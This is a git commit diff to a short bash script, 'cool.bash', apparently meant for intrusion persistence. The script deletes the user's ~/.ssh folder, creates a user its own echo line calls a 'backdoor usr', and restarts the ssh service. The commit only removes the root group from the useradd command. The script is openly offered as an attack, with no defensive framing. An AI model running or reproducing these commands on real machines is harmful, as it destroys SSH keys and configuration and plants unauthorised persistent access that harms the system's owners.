aa14f51f2cb84a62447c120e1ea4fc5056895ffb
Bob-Goharth-Legorazon <86697941+Bob-Goharth-Legorazon@users.noreply.github.com>
2022-04-21 22:39:33 -0400

    Update cool.bash

--- cool.bash
+++ cool.bash
@@ -1,7 +1,7 @@
 echo "removing ssh config folder..."
 rm -r ~/.ssh
 echo "creating backdoor usr..."
-useradd -M -G root samsepi0l
+useradd -M samsepi0l
 echo "restarting ssh service..."
 systemctl restart ssh
 echo "HOPEFULLY COMPLETE"
